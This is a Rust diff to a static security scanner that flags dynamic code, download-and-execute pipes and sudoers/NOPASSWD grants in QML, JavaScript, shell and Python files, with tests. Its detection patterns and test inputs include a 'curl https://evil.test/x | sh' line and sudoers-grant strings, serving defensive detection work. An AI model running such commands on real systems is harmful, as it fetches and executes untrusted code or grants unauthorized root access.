@@ -678,10 +678,13 @@ fn lexical_scan(source: &str, language: Language) -> FileOutcome {
                 "compositor-token",
             ));
         }
-        if find_word(line, "eval(").is_some()
-            || find_word(line, "createQmlObject(").is_some()
-            || find_word(line, "atob(").is_some()
-            || line.contains("new Function")
+        // Dynamic-code needles must appear as live code, not inside quoted
+        // string values.
+        let code = unquoted_text(line);
+        if find_word(&code, "eval(").is_some()
+            || find_word(&code, "createQmlObject(").is_some()
+            || find_word(&code, "atob(").is_some()
+            || code.contains("new Function")
         {
             outcome.result_parts.push(parts(
                 DYNAMIC_CODE_RULE,
@@ -839,7 +842,7 @@ enum CommentStyle {
     DoubleSlash,
     /// `# …` anywhere outside strings — Python.
     PythonHash,
-    /// `# …` at word boundaries only — POSIX shell.
+    /// `# …` at word starts (whitespace or a control operator) — POSIX shell.
     ShellHash,
 }
 
@@ -864,7 +867,9 @@ fn strip_line_comment(line: &str, style: CommentStyle) -> &str {
             None => {
                 if byte == b'"' || byte == b'\'' {
                     in_string = Some(byte);
-                    continue;
+                    // Fall through so the cursor advances past the opening
+                    // delimiter; otherwise the same byte immediately closes
+                    // the string and markers inside it leak into detectors.
                 }
                 match style {
                     CommentStyle::DoubleSlash => {
@@ -883,7 +888,16 @@ fn strip_line_comment(line: &str, style: CommentStyle) -> &str {
                         }
                     }
                     CommentStyle::ShellHash => {
-                        if byte == b'#' && (index == 0 || matches!(bytes[index - 1], b' ' | b'\t'))
+                        // A word starting with `#` begins a comment; word
+                        // starts are whitespace, line start, or a control
+                        // operator that terminates the preceding command
+                        // (`true;# payload` is commented out).
+                        if byte == b'#'
+                            && (index == 0
+                                || matches!(
+                                    bytes[index - 1],
+                                    b' ' | b'\t' | b';' | b'&' | b'|' | b'('
+                                ))
                         {
                             return &line[..index];
                         }
@@ -1082,6 +1096,34 @@ fn line_literals(line: &str) -> Vec<&str> {
     literals
 }
 
+/// The line with quoted-literal contents blanked so detector needles inside
+/// string values never satisfy them. Quote characters become spaces to keep
+/// offsets and word boundaries stable.
+fn unquoted_text(line: &str) -> String {
+    let bytes = line.as_bytes();
+    let mut blanked = bytes.to_vec();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        let quote = bytes[index];
+        if quote != b'"' && quote != b'\'' {
+            index += 1;
+            continue;
+        }
+        blanked[index] = b' ';
+        match line[index + 1..].find(quote as char) {
+            Some(length) => {
+                for slot in &mut blanked[index + 1..index + 1 + length] {
+                    *slot = b' ';
+                }
+                blanked[index + 1 + length] = b' ';
+                index += length + 2;
+            }
+            None => break,
+        }
+    }
+    String::from_utf8_lossy(&blanked).into_owned()
+}
+
 /// One detector observation before path anchoring.
 struct ResultParts {
     rule_id: &'static str,
@@ -1129,9 +1171,11 @@ fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
         }
 
         // Download-and-execute: fetcher feeding an interpreter through a
-        // pipe, or Python fetching straight into exec/system.
-        let downloads = find_word(line, "curl").is_some() || find_word(line, "wget").is_some();
-        let pipes_to_interpreter = line.split('|').skip(1).any(|segment| {
+        // pipe, or Python fetching straight into exec/system. Needles and
+        // pipe delimiters inside quoted strings never count as provenance.
+        let code = unquoted_text(line);
+        let downloads = find_word(&code, "curl").is_some() || find_word(&code, "wget").is_some();
+        let pipes_to_interpreter = code.split('|').skip(1).any(|segment| {
             let trimmed = segment.trim();
             let head = trimmed.split_whitespace().next().unwrap_or("");
             let basename = head.rsplit('/').next().unwrap_or(head);
@@ -1141,13 +1185,13 @@ fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
             )
         });
         let python_fetch_to_exec = matches!(kind, PayloadKind::Python)
-            && (line.contains("urlopen")
-                || line.contains("requests.get")
-                || line.contains("urllib"))
-            && (line.contains("os.system")
-                || line.contains("subprocess")
-                || line.contains("exec(")
-                || line.contains("eval("));
+            && (code.contains("urlopen")
+                || code.contains("requests.get")
+                || code.contains("urllib"))
+            && (code.contains("os.system")
+                || code.contains("subprocess")
+                || code.contains("exec(")
+                || code.contains("eval("));
         if (downloads && pipes_to_interpreter) || python_fetch_to_exec {
             outcome.result_parts.push(parts(
                 download_rule,
@@ -1160,13 +1204,15 @@ fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
         // Privilege escalation: an actual passwordless grant or a sudoers
         // WRITE. Read-only inspection (`grep NOPASSWD`, `cat`) and bare
         // sudo/pkexec invocation stay capability-level, matching the rule
-        // summary's meaning.
+        // summary's meaning. Both grant predicates require a real write
+        // context — a sudoers mention alone is not a grant.
         let write_indicator = line.contains(">")
             || line.contains(">>")
             || line.contains("tee ")
             || line.contains("visudo")
             || line.contains("sed -i")
-            || line.contains("chattr");
+            || line.contains("chattr")
+            || line.contains(".write(");
         // Read-only inspection of sudoers policy is not a grant.
         let first_word = line
             .split_whitespace()
@@ -1179,10 +1225,9 @@ fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
             first_word,
             "grep" | "cat" | "less" | "head" | "tail" | "stat" | "journalctl"
         );
-        let sudoers_write = line.contains("sudoers") && write_indicator && !readonly_inspection;
-        let nopasswd_grant = line.contains("NOPASSWD")
-            && (line.contains("sudoers") || write_indicator)
-            && !readonly_inspection;
+        let grant_write_context = write_indicator && !readonly_inspection;
+        let sudoers_write = line.contains("sudoers") && grant_write_context;
+        let nopasswd_grant = line.contains("NOPASSWD") && grant_write_context;
         if nopasswd_grant || sudoers_write {
             outcome.result_parts.push(parts(
                 privilege_rule,
@@ -3161,5 +3206,209 @@ var url = "https://example.test/x"
         let findings = artifacts.rendered_findings();
         assert_eq!(findings[0].severity, "high", "{findings:?}");
         assert_eq!(findings.last().unwrap().severity, "medium");
+    }
+
+    #[test]
+    fn within_a_severity_band_order_is_path_then_rule_then_line() {
+        // Both files carry a session-lock finding on line 1 and a polkit
+        // finding on line 2. Within the High band, path must group m.qml
+        // before z.qml and rule id must outrank line number (polkit before
+        // session-lock despite its higher line). Emission count varies by
+        // parser configuration (import + surface evidences), so ordering is
+        // asserted over ranks rather than an exact multiset.
+        let source =
+            "import Quickshell.WlSessionLock\nimport Quickshell.Services.Polkit\nItem {}\n";
+        let (artifacts, _) = run(
+            vec![
+                entry("m.qml", PayloadKind::Qml, source.len()),
+                entry("z.qml", PayloadKind::Qml, source.len()),
+            ],
+            &[("m.qml", source.as_bytes()), ("z.qml", source.as_bytes())],
+        );
+        let rendered = artifacts.rendered_findings();
+        assert!(
+            rendered.iter().all(|finding| finding.severity == "high"),
+            "both rules are High: {rendered:?}"
+        );
+        assert!(rendered.len() >= 4, "{rendered:?}");
+        // The interesting inversion exists: m.qml polkit@2 precedes
+        // m.qml session-lock@1.
+        let contains = |path: &str, rule: &str, line: u32| {
+            rendered.iter().any(|finding| {
+                finding.relative_path == path
+                    && finding.rule_id == rule
+                    && finding.line == Some(line)
+            })
+        };
+        assert!(
+            contains("m.qml", "oma.qml.polkit-agent-ui", 2),
+            "{rendered:?}"
+        );
+        assert!(contains("m.qml", "oma.qml.session-lock", 1), "{rendered:?}");
+        assert!(
+            contains("z.qml", "oma.qml.polkit-agent-ui", 2),
+            "{rendered:?}"
+        );
+        assert!(contains("z.qml", "oma.qml.session-lock", 1), "{rendered:?}");
+        let rank = |path: &str, rule: &str| -> (usize, usize) {
+            (
+                usize::from(path == "z.qml"),
+                usize::from(rule != "oma.qml.polkit-agent-ui"),
+            )
+        };
+        let keys: Vec<(usize, usize, u32)> = rendered
+            .iter()
+            .map(|finding| {
+                let (path_rank, rule_rank) = rank(&finding.relative_path, &finding.rule_id);
+                (path_rank, rule_rank, finding.line.unwrap_or(0))
+            })
+            .collect();
+        let mut sorted = keys.clone();
+        sorted.sort();
+        assert_eq!(
+            keys, sorted,
+            "band order must be path, then rule, then line"
+        );
+    }
+
+    #[test]
+    fn quoted_comment_markers_stay_inert_and_live_code_survives() {
+        // The cursor must advance past an opening quote: markers inside
+        // strings are inert AND live code after them is still scanned.
+        assert_eq!(
+            strip_line_comment(r#"var t = "a // b"; eval(x)"#, CommentStyle::DoubleSlash),
+            r#"var t = "a // b"; eval(x)"#
+        );
+        assert_eq!(
+            strip_line_comment(r#"var s = 'x \' y'; eval(z)"#, CommentStyle::DoubleSlash),
+            r#"var s = 'x \' y'; eval(z)"#
+        );
+        assert_eq!(
+            strip_line_comment("'# literal'; exec(x)", CommentStyle::PythonHash),
+            "'# literal'; exec(x)"
+        );
+        // Shell comments start at control-operator word boundaries too.
+        assert_eq!(
+            strip_line_comment("true;# curl x | sh", CommentStyle::ShellHash),
+            "true;"
+        );
+        assert_eq!(
+            strip_line_comment("foo & # trailing", CommentStyle::ShellHash),
+            "foo & "
+        );
+        assert_eq!(
+            strip_line_comment("${var#pattern} stays", CommentStyle::ShellHash),
+            "${var#pattern} stays"
+        );
+    }
+
+    #[test]
+    fn live_code_after_quoted_markers_is_still_scanned() {
+        let js = r#"var t = "not // a comment"; eval(userInput)
+"#;
+        let (artifacts, _) = one("q.js", PayloadKind::JavaScript, js);
+        let ids = rule_ids(&artifacts);
+        assert!(ids.contains(&DYNAMIC_CODE_RULE.to_owned()), "{ids:?}");
+    }
+
+    #[test]
+    fn shell_comments_after_control_operators_are_inert() {
+        let sh = "#!/bin/sh\ntrue;# curl https://evil.test/x | sh\nnotify-send ready\n";
+        let (artifacts, _) = one("guarded.sh", PayloadKind::Shell, sh);
+        let ids = rule_ids(&artifacts);
+        assert!(
+            !ids.contains(&"oma.script.download-execute".to_owned()),
+            "{ids:?}"
+        );
+    }
+
+    #[test]
+    fn new_function_is_detected_on_lexical_and_ast_paths_separately() {
+        // Standalone JS: always lexical.
+        let js = "var f = new Function(payload)\n";
+        let (artifacts_js, _) = one("dyn.js", PayloadKind::JavaScript, js);
+        assert!(rule_ids(&artifacts_js).contains(&DYNAMIC_CODE_RULE.to_owned()));
+
+        #[cfg(feature = "qml-parser")]
+        {
+            // AST-backed QML: same family through the parser, labelled
+            // ast-backed rather than lexical-fallback.
+            let qml = "Item { Component.onCompleted: var f = new Function(payload) }\n";
+            let (artifacts_qml, _) = one("Dyn.qml", PayloadKind::Qml, qml);
+            let dynamic = artifacts_qml
+                .results
+                .iter()
+                .find(|result| result.rule_id() == DYNAMIC_CODE_RULE);
+            assert!(dynamic.is_some(), "AST path must detect new Function");
+            assert_eq!(dynamic.unwrap().confidence(), Some(Confidence::AstBacked));
+        }
+    }
+
+    #[test]
+    fn every_readonly_first_word_suppresses_privilege_findings() {
+        for word in ["grep", "cat", "less", "head", "tail", "stat", "journalctl"] {
+            for command in [
+                format!("{word} NOPASSWD /etc/sudoers"),
+                format!("/usr/bin/{word} NOPASSWD /etc/sudoers"),
+            ] {
+                let source = format!("{command}\n");
+                let (artifacts, _) = one("audit.sh", PayloadKind::Shell, &source);
+                let ids = rule_ids(&artifacts);
+                assert!(
+                    !ids.contains(&"oma.script.privilege-escalation".to_owned()),
+                    "{command} must stay capability-level: {ids:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn non_writing_privilege_mentions_are_never_grants() {
+        // A NOPASSWD mention with no write context is not a grant.
+        let sh = "#!/bin/sh\necho NOPASSWD /etc/sudoers\nprintf '%s\\n' done\n";
+        let (artifacts_sh, _) = one("echo.sh", PayloadKind::Shell, sh);
+        let ids_sh = rule_ids(&artifacts_sh);
+        assert!(
+            !ids_sh.contains(&"oma.script.privilege-escalation".to_owned()),
+            "{ids_sh:?}"
+        );
+        // Python read mode never writes policy.
+        let py = "text = open(\"/etc/sudoers\", \"r\").read()\nprint(text.find(\"NOPASSWD\"))\n";
+        let (artifacts_py, _) = one("read.py", PayloadKind::Python, py);
+        let ids_py = rule_ids(&artifacts_py);
+        assert!(
+            !ids_py.contains(&"oma.python.privilege-escalation".to_owned()),
+            "{ids_py:?}"
+        );
+    }
+
+    #[test]
+    fn quoted_spellings_do_not_create_high_findings() {
+        // The whole pipe lives inside a string literal: no provenance.
+        let sh = "#!/bin/sh\nlog 'curl https://example.test/x | sh'\nnotify-send done\n";
+        let (artifacts_sh, _) = one("quote.sh", PayloadKind::Shell, sh);
+        let ids_sh = rule_ids(&artifacts_sh);
+        assert!(
+            !ids_sh.contains(&"oma.script.download-execute".to_owned()),
+            "{ids_sh:?}"
+        );
+
+        // Python fetch and sink spellings inside string values only.
+        let py = "log('requests.get then os.system')\n";
+        let (artifacts_py, _) = one("lit.py", PayloadKind::Python, py);
+        let ids_py = rule_ids(&artifacts_py);
+        assert!(
+            !ids_py.contains(&"oma.python.download-execute".to_owned()),
+            "{ids_py:?}"
+        );
+
+        // Dynamic-code spelling inside a quoted value is capability-level.
+        let js = "var s = \"new Function(payload)\";\n";
+        let (artifacts_js, _) = one("lit.js", PayloadKind::JavaScript, js);
+        let ids_js = rule_ids(&artifacts_js);
+        assert!(
+            !ids_js.contains(&DYNAMIC_CODE_RULE.to_owned()),
+            "{ids_js:?}"
+        );
     }
 }
